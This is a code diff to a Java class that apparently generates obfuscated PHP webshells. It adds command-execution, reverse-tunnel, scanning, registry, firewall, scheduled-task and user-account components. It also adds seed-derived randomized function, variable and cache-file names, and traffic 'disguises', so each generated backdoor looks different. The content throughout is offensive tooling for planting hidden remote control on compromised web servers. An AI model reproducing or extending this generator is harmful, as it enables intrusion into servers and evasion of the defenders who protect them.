@@ -41,7 +41,11 @@ public final class PhpScriptGeneratorProvider implements ScriptGeneratorProvider
             "BasicInfoComponent", "ExecCommandComponent", "ExecCommandSimpleComponent", "FileComponent",
             "FileDownloadComponent", "FileUploadComponent", "ExecScriptComponent",
             "DatabaseComponent", "CompressComponent", "DecompressComponent", "PluginComponent",
-            "HttpRequestComponent", "ProxyForwardComponent", "ReverseTunnelComponent");
+            "HttpRequestComponent", "ProxyForwardComponent", "ReverseTunnelComponent",
+            "ProcessComponent", "NetworkInfoComponent", "DiskComponent",
+            "NetworkConnectionComponent", "ScanComponent", "ServiceComponent",
+            "ScheduledTaskComponent", "RegistryComponent", "EventLogComponent",
+            "FirewallComponent", "UserAccountComponent");
 
     @Override
     public PuppetRuntime getRuntime() {
@@ -56,7 +60,7 @@ public final class PhpScriptGeneratorProvider implements ScriptGeneratorProvider
         metadata.put("fileExtensions", List.of("php"));
         metadata.put("minimumVersion", MINIMUM_VERSION);
         metadata.put("protocols", List.of("http"));
-        metadata.put("coreProtocol", "M0-M3");
+        metadata.put("coreProtocol", "Envelope");
         metadata.put("coreOperations", List.of("test", "forward", "load", "invoke"));
         metadata.put("outputModes", List.of(OUTPUT_COMPACT, OUTPUT_PACKED, OUTPUT_PORTABLE));
         metadata.put("defaultOutputMode", OUTPUT_COMPACT);
@@ -104,9 +108,14 @@ public final class PhpScriptGeneratorProvider implements ScriptGeneratorProvider
         }
 
         CoreSymbols symbols = CoreSymbols.create(generationSeed);
+        CacheSymbols cacheSymbols = CacheSymbols.create(generationSeed);
         String requestDecoder = PhpSourceSupport.requestDecodeFunction(requestDisguise);
         String responseEncoder = PhpSourceSupport.responseEncodeFunction(responseDisguise);
-        String coreSource = symbols.apply(compactTemplate(readTemplate(CORE_TEMPLATE)));
+        String coreTemplate = readTemplate(CORE_TEMPLATE)
+                .replace("{{CACHE_NAMESPACE}}", cacheSymbols.namespace())
+                .replace("{{CACHE_SUFFIX}}", cacheSymbols.suffix())
+                .replace("{{CACHE_TEMP_PREFIX}}", cacheSymbols.temporaryPrefix());
+        String coreSource = symbols.apply(compactTemplate(coreTemplate));
         List<String> components = DEFAULT_COMPONENTS;
         String expandedSource = compactTemplate(readTemplate(TEMPLATE))
                 .replace("{{WIRE_HELPERS}}", PhpSourceSupport.wireHelpers())
@@ -131,7 +140,7 @@ public final class PhpScriptGeneratorProvider implements ScriptGeneratorProvider
         metadata.put("protocol", "http");
         metadata.put("minimumVersion", requirements.get("minVersion"));
         metadata.put("protocolVersion", 2);
-        metadata.put("coreProtocol", "M0-M3");
+        metadata.put("coreProtocol", "Envelope");
         metadata.put("coreOperations", List.of("test", "forward", "load", "invoke"));
         metadata.put("outputMode", outputMode);
         metadata.put("components", components);
@@ -145,6 +154,7 @@ public final class PhpScriptGeneratorProvider implements ScriptGeneratorProvider
         });
         metadata.put("generationSeed", generationSeed);
         metadata.put("variantId", digestHex(generationSeed).substring(0, 12));
+        metadata.put("cacheLayout", "seed-derived-opaque-v1");
         metadata.put("uncompressedBytes", expandedSource.getBytes(StandardCharsets.UTF_8).length);
         metadata.put("generatedBytes", source.getBytes(StandardCharsets.UTF_8).length);
         metadata.put("requestDisguiseId", requestDisguise.getDisguiseId());
@@ -160,12 +170,24 @@ public final class PhpScriptGeneratorProvider implements ScriptGeneratorProvider
         Map<String, Object> common = Map.of(
                 "functions", List.of("stream_select"),
                 "functionsAnyOf", List.of("shell_exec", "exec", "popen"));
-        return Map.of(
-                "DatabaseComponent", Map.of(
-                        "classes", List.of("PDO"),
-                        "pdoDriversAnyOf", List.of("mysql", "pgsql", "sqlsrv", "dblib", "oci", "sqlite")),
-                "ProxyForwardComponent", common,
-                "ReverseTunnelComponent", common);
+        Map<String, Object> requirements = new LinkedHashMap<>();
+        requirements.put("DatabaseComponent", Map.of(
+                "classes", List.of("PDO"),
+                "pdoDriversAnyOf", List.of("mysql", "pgsql", "sqlsrv", "dblib", "oci", "sqlite")));
+        requirements.put("CompressComponent", Map.of("classes", List.of("ZipArchive")));
+        requirements.put("DecompressComponent", Map.of("classes", List.of("ZipArchive")));
+        requirements.put("ProcessComponent", Map.of("functionsAnyOf", List.of("shell_exec", "exec")));
+        requirements.put("NetworkConnectionComponent", Map.of("functionsAnyOf", List.of("shell_exec", "exec")));
+        requirements.put("ServiceComponent", Map.of("functionsAnyOf", List.of("shell_exec", "exec")));
+        requirements.put("ScheduledTaskComponent", Map.of("functionsAnyOf", List.of("shell_exec", "exec")));
+        requirements.put("RegistryComponent", Map.of("functionsAnyOf", List.of("shell_exec", "exec")));
+        requirements.put("FirewallComponent", Map.of("functionsAnyOf", List.of("shell_exec", "exec")));
+        requirements.put("ScanComponent", Map.of(
+                "functions", List.of("stream_socket_client"),
+                "functionsAnyOf", List.of("shell_exec", "exec", "popen")));
+        requirements.put("ProxyForwardComponent", common);
+        requirements.put("ReverseTunnelComponent", common);
+        return requirements;
     }
 
     private Map<String, Object> runtimeRequirements(Disguise requestDisguise, Disguise responseDisguise,
@@ -364,12 +386,14 @@ public final class PhpScriptGeneratorProvider implements ScriptGeneratorProvider
         private static CoreSymbols create(String seed) {
             Map<String, String> replacements = new LinkedHashMap<>();
             List<String> functions = List.of("phpcore_id", "phpcore_dir", "phpcore_path", "phpcore_open",
-                    "phpcore_test", "phpcore_load", "phpcore_invoke", "phpcore_forward", "phpcore_run");
+                    "phpcore_sweep", "phpcore_test", "phpcore_load", "phpcore_invoke", "phpcore_forward",
+                    "phpcore_envelope_response", "phpcore_run");
             for (String function : functions) replacements.put(function, symbol(seed, function, "f"));
-            List<String> variables = List.of("$create", "$dir", "$params", "$name", "$key", "$path",
+            List<String> variables = List.of("$create", "$dir", "$params", "$name", "$key", "$family", "$path",
                     "$component", "$components", "$source", "$temporary", "$old", "$action", "$result",
                     "$url", "$body", "$headers", "$lines", "$value", "$lower", "$curl", "$response",
-                    "$context", "$method");
+                    "$context", "$method", "$keep", "$now", "$files", "$modified", "$left", "$right",
+                    "$remove");
             for (String variable : variables) replacements.put(variable, "$" + symbol(seed, variable, "v"));
             return new CoreSymbols(replacements, replacements.get("phpcore_run"));
         }
@@ -387,6 +411,16 @@ public final class PhpScriptGeneratorProvider implements ScriptGeneratorProvider
                 result = result.replace(entry.getKey(), entry.getValue());
             }
             return result;
+        }
+    }
+
+    private record CacheSymbols(String namespace, String suffix, String temporaryPrefix) {
+        private static CacheSymbols create(String seed) {
+            String digest = digestHex(seed + "|php-cache-layout");
+            List<String> suffixes = List.of("cache", "dat", "bin", "idx");
+            int suffixIndex = Integer.parseInt(digest.substring(0, 2), 16) % suffixes.size();
+            return new CacheSymbols(digest.substring(2, 16), suffixes.get(suffixIndex),
+                    digest.substring(16, 24));
         }
     }
 
